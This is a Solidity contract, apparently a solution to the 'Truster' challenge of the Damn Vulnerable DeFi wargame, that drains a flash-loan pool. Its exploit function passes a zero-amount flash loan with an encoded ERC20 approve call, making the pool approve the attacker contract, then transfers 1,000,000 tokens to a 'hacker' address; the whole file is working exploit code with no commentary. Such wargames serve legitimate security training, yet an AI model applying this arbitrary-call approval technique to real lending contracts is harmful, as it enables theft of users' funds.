// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterExploiter {

    TrusterLenderPool pool;
    using Address for address;

    IERC20 public immutable damnValuableToken;
    address hacker = address(0);
    constructor (address tokenAddress, TrusterLenderPool _pool, address _hacker) {
        damnValuableToken = IERC20(tokenAddress);
        pool = _pool;
        hacker = _hacker;
    }
    
    function exploit() external {
        pool.flashLoan(
            0, 
            address(this), 
            address(damnValuableToken), 
            abi.encodeWithSelector(
                IERC20.approve.selector, 
                address(this), 
                10000000 ether
                )
            );
        damnValuableToken.transferFrom(address(pool), hacker, 1000000 ether);
    }

}
